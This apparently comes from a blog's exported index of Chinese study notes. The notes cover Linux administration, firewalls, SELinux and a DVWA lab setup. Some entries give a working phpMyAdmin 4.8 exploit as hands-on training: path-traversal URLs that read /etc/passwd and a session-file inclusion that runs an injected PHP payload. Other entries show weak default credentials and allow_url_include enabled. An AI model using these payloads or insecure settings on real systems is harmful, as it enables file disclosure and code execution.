进入conf目录下修改tomcat-users.xml 用户名和密码 1vi /usr/local/tomcat/conf/tomcat-users.xml 1234567891011&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;tomcat-usersversion="1.0" xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd" xmlns:xsi="http://www/w3.org/2001/XMLSchema-instance" xmlnx="http://tomcat.apache.org/xml"&gt; &lt;role rolename="manager-gui"/&gt; &lt;role rolename="manager-script"/&gt; &lt;role rolename="manager-jmx"/&gt; &lt;role rolename="manager-status"/&gt; &lt;role rolename="admin-gui"/&gt; &lt;role rolename="admin-script"/&gt; &lt;role rolename="manager-gui"/&gt; &lt;user roles="manager-gui, manager-script, manager-jmx, manager-status, admin-script" password="tomcat" username="tomcat"/&gt;&lt;/tomcat-users&gt; 4.git服务器搭建12345#修改yum源cat CentOS-Base.repo#[base]注释掉mirrorlist和baseurl添加以下语句baseurl=http://192.168.100.110:8000/yum/#以下三个修改为enable=0 12345678910111213141516171819#下载git[root@localhost]$ yum install git#添加git用户[root@localhost]$ useradd git[root@localhost]$ cd /home/git/[root@localhost]$ lltotal 0[root@localhost]$ pwd/home/git[root@localhost]$ cd ..[root@localhost]$ su git[git@localhost]$ mkdir .ssh[git@localhost]$ cd .ssh/[git@localhost]$ touch authorized_keys[git@localhost]$ chmod 600 authorized_keys[git@localhost]$ cd /[git@localhost~]$ mkdir Project[git@localhost~]$ cd Project[git@localhost Project]$ git init --bare icq.git win10启动powershell dir ssh 1ssh-keygen -t rsa 产生两个文件.pub是公钥 123dir .sshtype .\.ssh\id_rsa.pub#获得公钥 粘贴到git用户authorized_keys 12chmod 700 .sshchmod 600 authorized_keys 1yum install git 再创建用户git //管理git中所有的项目 在git用户家目录，创建.ssh文件夹，修改权限为700 //这个是因为ssh服务限制 在.ssh文件夹下创建authorized_keys文件 ，修改权限为600 //这个因为ssh服务的限制，权限不正确认证会失败 在git用户家目录创建project目录，用来存放git项目 12#初始化一个git项目git init --bare icq.git git客户端 安装git // git for windows git for linux windows 10 使用ssh创建公钥和私钥 ssh-keygen -t rsa 就会在家目录创建.ssh文件夹，里面就会有两个文件，将公钥(.pub结尾)写入到服务器authorized_keys文件中 1git clone git@ip:/home/git/project/icq.git Note:默认情况下 ssh git@192.168.100.167可以登录虚拟机，从而产生安全问题，在虚拟机里切换到root权限修改git的shell 1[root@localhost ~] usermod -s /sbin/nologin git 这样ssh就禁止了 5.搭建博客 安装Github桌面版和Node.js 然后cmd中 1npm install -g hexo-cli --registry=https://registry.nom.taobao.org 创建一个blog目录，用来存放博客 进入到blog中，启动cmd执行命令 123456#初始化hexohexo init#生成博客hexo g#搭建服务hexo s 然后浏览器访问播客主页 安装CentOs Mini，安装好后执行 1yum groupinstall "development tools" 周三Linux下应用的安装1.CentOS系统中有三种安装软件的方法 通过源码安装 ./configure make &amp;&amp; make install 通过rpm安装 rpm -ivh … 通过yum安装 yum search … yum install … rpm类型文件安装的时候，会先去读取文件内记载的设置参数内容，然后将该数据用来比对linux系统的环境，以找到是否有属性相依的软件尚未安装的问题。RPM使用自动化安装软件，比较类似windows下的.exe需要下载的安装包，但是它安装过程中会有很多依赖问题。 -q: 仅查询，后面接软件名称是否有安装 -qa: 列出所有，已经安装在本机linux系统上面的所有软件名称 -ql: 列出该软件所有的文件与目录所在完整文件名(list) -qR: 列出与该软件有关的相依软件所在的文件(requried) 源码安装：先阅读README文件，找到安装方法，安装相依赖的库，最后执行 1make &amp;&amp; make install 周四搭建apache+php+mysql和iptables+firewall1.昨天回顾12345yum installrpm -ivh a.rpm/http/ftp:baidu.com/a.tpm nginx.tar.gztar cat readme install./configure --help --prefix=安装路径 --with-apr=指定依赖位置make &amp;&amp; make install 2.搭建apache+php+mysql环境(要求使用php5.6) 安装httpd 12345678#安装httpdyum install httpd httpd-devel httpd-manual mod_ssl -y#启动apachesystemctl start httpd#设置apache开机启动systemctl enable httpd#查看开放端口，检查有没有httpd服务，80和443端口是否开放ss -antlp 配置防火墙，可以正常访问apache 123firewall-cmd --zone=public --add-port=80/tcp --permanentfirewall-cmd --zone=public --add-port=433/tcp --permanentfirewall-cmd --reload 安装php5.6 12345678910rpm -Uvh https://mirror.webtatic.com/yum/el7/epel-release.rpmrpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm#卸载系统中原有的phpyum remove php-common -y#安装php5.6和php扩展yum install -y php56w php56w-opcache php56w-xml php56w-mcrypt php56w-gd php56w-mysql php56w-intl php56w-mbstring#进入网站根目录cd /var/www/html/#在网站根目录中创建index.php，写入phpinfo函数，测试网站php是否正常echo '&lt;?php phpinfo();?&gt;' &gt; index.php 安装mariadb 123456789yum install mariadb-server -y#启动mariadb-serversystemctl start mariadb#设置mariadb-server开机自启systemctl enablemariadb#初始化mysql，注意记住mysql密码mysql_secure_installation#关机+快照poweroff 3.关于网站搭建：需要将网站的源代码使用工具复制到虚拟机中的网站根目录下(phpmyadmin除外)，修改网站的所有者为apache 1chown -R apache:apache /var/www/html wordpress特性： ​ 移动网站后，网站的样式将出错，所以wordpress在安装成功后，不能移动 ​ 虚拟机ip改变后，wordpress打开会卡页面，需要去数据库中修改ip wp_options表中 ​ siteurl: http://新ip ​ home: http://新ip 搭建没有提供安装引导的网站： ​ 上传网站源代码到网站根目录，找到网站的配置文件，一般是config.php ​ 再找到网站提供的sql文件，使用phpmyadmin之类工具，导入数据或直接使用mysql -uroot -p 登录数据库 123create database database_nameuse database_namesource absolute_path/name.sql 向数据库中导入内容，有多重方式，可以自行测试 周五Linux安全检查1.防火墙功能：​ filter功能是防火墙一个重要功能，它定义数据通过是允许或者不允许 ​ filter控制数据类型分为两类：INPUT和OUTPUT 2.Iptables命令讲解：-A 追加 -p 指定协议类型 123* tcp通过dport指定目标端口，sport指定源端口* udp通tcp* icmp通过--icmp-type指定类型，0是响应类型的数据包，8是请求类型的包 -m 表示启动扩展功能 ​ 一般和-p配合，-p指定类型后，通过-m打开此类型的扩展功能 -j 指定如何进行处理DROP，REJECT，ACCEPT/丢弃，拒绝，通过 1iptables -A INPUT/OUTPUT -j DROP/REJECT/ACCEPT 编辑iptables的配置文件： ​ 通过编辑文件可以直接修改iptables规则，编辑文件，写入指定规则： 123456-A INPUT -m state --state ESTABLISHED, RELATED -j ACCEPT-A INPUT -p icmp -j ACCEPT-A INPUT -i lo -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT-A INPUT -j REJECT --reject-with icmp-host-prohibited-A FORWARD -j REJECT --reject-with icmp-host-prohibited 12#查看现有规则iptables -nvL 12#添加80端口通过的规则firewallc-cmd --zone=public --add-port=80/tcp --permanent drop 默认丢弃所有包 –zone block 拒绝所有外部连接，允许内部发起连接 public 指定外部连接可以进入 –add-port 指定添加端口 80/tcp 53/udp –add-service 指定常见服务 http https mysql mssql ssh –permanent 永久生效 删除80端口通过的规则 1firewall-cmd --zone=public --remove-port=80/tcp --permanent –remove-port 指定删除端口 –remove-service 指定删除服务 12345678910#防火墙更新规则firewall-cmd --reload#防火墙显示所有规则firewall-cmd --list-all#关闭防火墙systemctl stop firewalld#查看防火墙状态systemctl status firewalld#启动防火墙systemctl start firewalld 临时加立即生效，–reload后失效，–pernament必须，–reload后才失效]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note11]]></title>
    <url>%2F2019%2F07%2F29%2Fnoteday11%2F</url>
    <content type="text"><![CDATA[1. SELINUX即Security-Enhanced Linux，是一个Linux内核模块，也是Linux的一个安全子系统。SELinux作用是最大限度地减少系统中服务进程可访问的资源（最小权限原则）。 如果一个以root身份运行的网络服务存在0day漏洞，黑客就可以利用这个漏洞，以root的身份在您的服务器上为所欲为。SELinux就是解决这个问题。 系统 资源能否被访问因素 无SELinux 某资源是否拥有对应用户的权限（读写执行） SELinux 还需要判断每一类进程是否拥有对某一类资源的访问权限 SELinux的工作模式 模式名称 工作模式 作用 enforcing 强制模式 违反SELinux规则的行为将组织并记录到日志中 permissive 宽容模式 违反SELinux规则的行为只会记录到日志中，调试用 disabled 关闭模式 关闭SELinux SELinux工作模式可以在/etc/selinux/config中设定 12#修改SELinux模式vi /etc/selinux/config 修改以后重启系统即可。 2.phpmyadmin4.8文件包含漏洞goto_whitelist白名单如下： 12345678910public static $goto_whitelist = array( 'db_datadict.php', 'db_sql.php', 'db_events.php', 'db_export.php', 'db_importdocsql.php', 'db_multi_table_query.php', 'db_structure.php', 'db_import.php',) 进入Vulnspy开始实验 从index.php定位到白名单中的php文件 1http://3395a164a7f3b89d07d1e02cf6a3792e.vsplate.me:28268/index.php?target=db_export.php? 将?改%253f读取系统文件，进行多次 ./以进入到系统的根目录，然后读取/etc/passwd 1http://3395a164a7f3b89d07d1e02cf6a3792e.vsplate.me:28268/index.php?target=db_export.php%253f../../../../../../../../../../etc/passwd Note: target=后面的文件填写白名单文件均可成功，?要用%253f代替 点击SQL输入 1select &apos;&lt;?php phpinfo(); exit;?&gt;&apos; Note:phpmyadmin特性是所有sql查询语句都早sess_id中存储着。 sess_id在/var/lib/php/session/目录中 3. docker容器类似于虚拟机，依赖与linux 1234567891011#查看创建的镜像docker images#启动dockerservice docker start#修改docker的用户组sudo usermod -G docker $USER#重启虚拟机rebootrebootdocker imagesdocker-composedocker run --rm -it alpine /bin/bash]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>SELinux - phpmyadmin</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpmyadmin-bug]]></title>
    <url>%2F2019%2F07%2F28%2Fphpmyadmin-bug%2F</url>
    <content type="text"><![CDATA[Abstract: phpmyadmin4.8漏洞演示 进入vulnsp网站，点击start to hack，跳转到VSPlat 点击进入实验，点击开始按钮 进入phpmyadmin登录界面，用户名：root，密码：toor登录 点击SQL，输入如下命令： 1select &apos;&lt;?php phpinfo(); exit;?&gt;&apos; 获取自己的SESSION ID 1session_id = d0fn5a9nckc5hu90j6re5glj3mmtdbpf 包含SESSION文件，成功利用该漏洞 1http://079d4a227c7ba70a8fd8e0a5f6bde15a.vsplate.me:47529/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_d0fn5a9nckc5hu90j6re5glj3mmtdbpf 网页输入payload，页面如下，成功利用该漏洞]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>phpmyadmin</tag>
        <tag>bug</tag>
        <tag>文件包含漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dvwa-deploy]]></title>
    <url>%2F2019%2F07%2F28%2Fdvwa-deploy%2F</url>
    <content type="text"><![CDATA[Abstract: CentOS7部署DVWA DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。 安装步骤 1.进入到/var/www目录下，然后wget下载dvwa文件，解压master.zip文件到html文件夹下，进入html文件夹下，修改DVWA-master文件名为dvwa，进入dvwa/config文件夹中，把config.inc.php.dist复制一份，命名为config.inc.php；‘cd /var/www’ &apos;wget https://github.com/ethicalhack3r/DVWA/archive/master.zip&apos; &apos;unzip master.zip -d html/&apos; &apos;cd html &amp;&amp; mv DVWA-master dvwa&apos; &apos;cd dvwa/config/&apos; &apos;co config.inc.php.dist config.inc.php&apos; 2.进入到/etc目录，先把php.ini备份一份名为php.ini.bak.20190727，打开php.ini，把allow_url_include=Off修改为On，保存退出，重启服务；‘cd /etc’ &apos;cp php.ini php.ini.bak.20190727&apos; &apos;vi php.ini&apos; &apos;systemctl restart httpd&apos; 3.进入/var/www/html/dvwa/config目录下，修改config.inc.php，把$_DVWA[ ‘db_password’ ]修改为mysql中root用户密码，并填写公钥和私钥，保存后退出；public_key: 6LePqhAUAAAAAH6Bn2okO9-8G-zNw46PNhotV4Q6private_key: 6LePqhAUAAAAAMVqhBbFr1NVA9H13FkyfAgBeZYx &apos;cd /var/www/html/dvwa/config&apos; &apos;vi config.inc.php&apos; 4.进入/var/www/html文件中，修改dvwa的用户和用户组‘chown -R apache:apache dvwa/‘ &apos;systemctl restart httpd&apos; 5.部署成功后，登录界面如下图所示，用户名：admin，密码：password，即可登录]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>dvwa</tag>
        <tag>linux</tag>
      </tags>
  </entry>
</search>
